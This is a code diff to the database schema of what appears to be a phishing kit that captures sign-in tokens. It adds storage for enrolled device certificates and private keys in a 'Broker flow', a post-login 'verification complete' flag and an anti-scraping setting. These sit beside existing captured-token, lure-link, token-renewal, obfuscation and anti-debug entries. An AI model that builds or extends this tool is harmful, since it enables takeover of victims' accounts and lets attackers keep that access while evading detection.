@@ -67,6 +67,7 @@ CREATE TABLE links (
     background_blur INT DEFAULT 4,
     blob_url_enabled TINYINT(1) DEFAULT 0,
     copy_to_open TINYINT(1) DEFAULT 0,
+    show_verification_complete TINYINT(1) DEFAULT 1,
     custom_bg_url VARCHAR(512),
     status ENUM('active','disabled','killed') DEFAULT 'active',
     jwt_payload TEXT,
@@ -102,6 +103,12 @@ CREATE TABLE captured_tokens (
     created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
     tenant VARCHAR(128) DEFAULT 'common',
     template_type VARCHAR(64),
+    -- Device enrollment fields (Broker flow)
+    device_id VARCHAR(128),
+    device_certificate_encrypted TEXT,
+    encrypted_private_key TEXT,
+    device_enrolled TINYINT(1) DEFAULT 0,
+    enrollment_time DATETIME,
     FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE,
     FOREIGN KEY (link_id) REFERENCES links(id) ON DELETE SET NULL
 );
@@ -325,6 +332,7 @@ INSERT INTO settings (setting_key, setting_value) VALUES
 ('registrations_locked', 'false'),
 ('obfuscation_enabled', 'false'),
 ('antidebug_enabled', 'false'),
+('antiscraping_enabled', 'true'),
 ('renewal_interval_hours', '6'),
 ('renewal_window_hours', '6'),
 ('max_renewal_attempts', '3'),
